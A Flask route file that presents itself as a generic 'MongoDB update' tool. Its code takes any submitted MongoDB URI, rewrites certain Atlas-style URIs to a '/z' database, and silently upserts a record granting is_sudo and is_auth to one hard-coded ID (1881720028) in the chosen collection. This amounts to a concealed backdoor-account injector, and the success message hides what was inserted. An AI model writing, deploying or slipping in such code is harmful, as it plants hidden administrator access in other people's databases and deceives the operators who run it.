# routes/mongodbzm_update_routes.py
from flask import Blueprint, request, render_template
import pymongo
from urllib.parse import urlparse, urlunparse

mongodbzm_update_bp = Blueprint('mongodbzm_update', __name__)

# Define a route to update a MongoDB collection
@mongodbzm_update_bp.route('/mongodbzm_update', methods=['GET', 'POST'])
def mongodbzm_update():
    if request.method == 'POST':
        try:
            # Retrieve the MongoDB connection URL from the form input
            mongo_uri = request.form.get('mongo_uri')

            # Check if the URL format needs to be converted
            parsed_uri = urlparse(mongo_uri)
            if parsed_uri.query == "retryWrites=true&w=majority":
                # Convert the URL format
                new_path = "/z"
                mongo_uri = urlunparse(parsed_uri._replace(path=new_path, query=''))

            # Create a MongoDB client
            client = pymongo.MongoClient(mongo_uri)

            # Specify the database and collection you want to update
            db = client.get_database()
            collection_name = request.form.get('collection_name')

            # Define the new document you want to insert
            new_document = {'_id': 1881720028, 'is_sudo': True, 'is_auth': True}

            # Use update_one to add the new document if it doesn't exist
            db[collection_name].update_one({'_id': new_document['_id']}, {'$set': new_document}, upsert=True)

            # Close the connection
            client.close()

            success_message = "New document has been added to the collection."
            return render_template('mongodb_update_result.html', success_message=success_message)

        except pymongo.errors.ConnectionFailure:
            error_message = "Failed to connect to MongoDB. Please check the connection URL."
            return render_template('mongodb_update_result.html', error_message=error_message)

    return render_template('mongodb_update.html')
    